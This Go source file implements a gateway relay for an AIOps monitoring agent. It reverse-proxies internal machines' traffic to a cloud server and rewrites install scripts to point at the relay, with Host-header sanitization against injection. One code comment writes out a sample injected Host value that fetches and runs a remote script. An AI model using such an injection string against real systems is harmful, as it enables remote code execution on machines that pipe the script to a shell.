package main

import (
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

// runRelay starts the agent in gateway relay mode: it listens on a local port
// and reverse-proxies all requests to the upstream cloud server. Internal
// machines that can't reach the internet point their agents at this relay
// instead of the cloud — only the gateway machine needs internet access.
//
// Install scripts (/install.sh, /install.ps1) are intercepted so the SERVER
// address is rewritten to the relay's own address: internal machines fetch the
// script through the relay and auto-configure with the relay as their server,
// then download binaries and report metrics through the relay — zero manual
// configuration needed.
func runRelay(listenAddr, upstream string) {
	target, err := url.Parse(upstream)
	if err != nil {
		log.Fatalf("Relay: 无效的上游地址 %q: %v", upstream, err)
	}

	proxy := httputil.NewSingleHostReverseProxy(target)
	// Flush promptly so streaming responses (terminal tx/rx, long-poll) feel real-time.
	proxy.FlushInterval = 100 * time.Millisecond
	// Custom transport with high MaxIdleConnsPerHost: the default transport keeps
	// only 2 idle connections per host, which causes TCP churn when many internal
	// agents report concurrently through the relay.
	proxy.Transport = relayTransport

	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Intercept install scripts: rewrite SERVER to the relay's address so
		// internal machines auto-configure to connect through the relay.
		if r.URL.Path == "/install.sh" || r.URL.Path == "/install.ps1" {
			serveRelayInstallScript(w, r, upstream)
			return
		}
		proxy.ServeHTTP(w, r)
	})

	log.Printf("╔══════════════════════════════════════════════════════╗")
	log.Printf("║  AIOps Agent — 网关中继模式 (Relay)                    ║")
	log.Printf("║  监听: %-16s  上游: %-26s║", listenAddr, upstream)
	log.Printf("╚══════════════════════════════════════════════════════╝")
	// Extract port for the install command hint: listenAddr may be ":8529",
	// "0.0.0.0:8529", or "127.0.0.1:8529" — the hint should always show :<port>.
	relayPort := listenAddr
	if _, port, err := net.SplitHostPort(listenAddr); err == nil && port != "" {
		relayPort = ":" + port
	} else if !strings.HasPrefix(listenAddr, ":") {
		relayPort = ":" + listenAddr
	}
	log.Printf("内网机器安装命令: curl -fsSL http://<本机IP>%s/install.sh | sh", relayPort)

	// Warn when binding to all interfaces — the relay is reachable by anyone
	// on the network. For internet-exposed gateways, bind to the internal IP.
	if listenAddr == "" || strings.HasPrefix(listenAddr, ":") ||
		strings.HasPrefix(listenAddr, "0.0.0.0:") {
		log.Printf("⚠ 监听地址绑定到所有网卡——如不需外部访问，建议用 --listen 192.168.x.x:8529 绑定到内网IP")
	}

	srv := &http.Server{
		Addr:              listenAddr,
		Handler:           handler,
		ReadHeaderTimeout: 10 * time.Second,
		// No Read/Write timeout: terminal streams and long-polls need unbounded duration.
	}
	if err := srv.ListenAndServe(); err != nil {
		log.Fatalf("Relay 启动失败: %v", err)
	}
}

// relayTransport is the custom transport for the reverse proxy. It raises
// MaxIdleConnsPerHost from the default 2 to 50 so concurrent internal agents
// reuse pooled connections instead of churning TCP handshakes.
var relayTransport = &http.Transport{
	MaxIdleConns:        100,
	MaxIdleConnsPerHost: 50,
	IdleConnTimeout:     90 * time.Second,
	ForceAttemptHTTP2:   true,
	DialContext: (&net.Dialer{
		Timeout:   10 * time.Second,
		KeepAlive: 30 * time.Second,
	}).DialContext,
}

// relayClient is used for the one-shot install-script fetch (small response,
// generated instantly — a 15s timeout is plenty).
var relayClient = &http.Client{Timeout: 15 * time.Second}

// serverLineRe matches the SERVER= / $Server = assignment line in install
// scripts, so the relay can rewrite the URL to its own address regardless of
// how the upstream rendered it (scheme, port, trailing slash, …).
var serverLineRe = regexp.MustCompile(`((?:SERVER|\$Server)\s*=\s*")[^"]+(")`)

// maxInstallScriptSize caps how much we read from the upstream when proxying
// install scripts. Real scripts are < 8 KB; anything larger is suspicious.
const maxInstallScriptSize = 256 * 1024

// sanitizeHost strips any character that could break out of a shell
// double-quoted string when the host is injected into an install script's
// SERVER="..." line. Without this, a crafted Host header like
// `x"; curl malware.sh | sh; echo "` would inject commands into the
// script that an internal machine pipes to sh.
func sanitizeHost(h string) string {
	return strings.Map(func(r rune) rune {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
			return r
		case r == '.' || r == ':' || r == '-' || r == '[' || r == ']':
			return r // IP addresses, ports, IPv6 brackets, domain hyphens
		default:
			return -1
		}
	}, h)
}

// serveRelayInstallScript proxies an install.sh / install.ps1 request to the
// upstream cloud server, then rewrites the SERVER address in the response body
// to the relay's own address (derived from the sanitized request Host header).
// Internal machines thus auto-configure to connect through the relay.
func serveRelayInstallScript(w http.ResponseWriter, r *http.Request, upstream string) {
	// Build the upstream URL (upstream is already normalized without trailing slash).
	upstreamURL := upstream + r.URL.Path
	if r.URL.RawQuery != "" {
		upstreamURL += "?" + r.URL.RawQuery
	}

	req, err := http.NewRequestWithContext(r.Context(), "GET", upstreamURL, nil)
	if err != nil {
		http.Error(w, "Relay: 构建请求失败", http.StatusInternalServerError)
		return
	}

	resp, err := relayClient.Do(req)
	if err != nil {
		http.Error(w, "Relay: 无法连接上游服务端 ("+upstream+")", http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	// Cap the body: install scripts are tiny; a megabyte response means the
	// upstream is broken or malicious — don't buffer it all into memory.
	body, err := io.ReadAll(io.LimitReader(resp.Body, maxInstallScriptSize))
	if err != nil {
		http.Error(w, "Relay: 读取安装脚本失败", http.StatusInternalServerError)
		return
	}

	// Sanitize the Host header to prevent command injection via crafted Host.
	// Only hostname/IP/port characters survive; quotes, semicolons, backticks
	// etc. are stripped so they can never break out of the shell double-quoted
	// assignment in the install script.
	host := sanitizeHost(r.Host)
	if host == "" {
		http.Error(w, "Relay: 无效的 Host 头", http.StatusBadRequest)
		return
	}

	// Rewrite SERVER="..." (and $Server = "...") to the relay's address.
	relayURL := "http://" + host
	rewritten := serverLineRe.ReplaceAllString(string(body), "${1}"+relayURL+"${2}")

	// Copy content type + status.
	if ct := resp.Header.Get("Content-Type"); ct != "" {
		w.Header().Set("Content-Type", ct)
	}
	w.Header().Set("Content-Length", strconv.Itoa(len(rewritten)))
	w.WriteHeader(resp.StatusCode)
	_, _ = io.WriteString(w, rewritten)
}
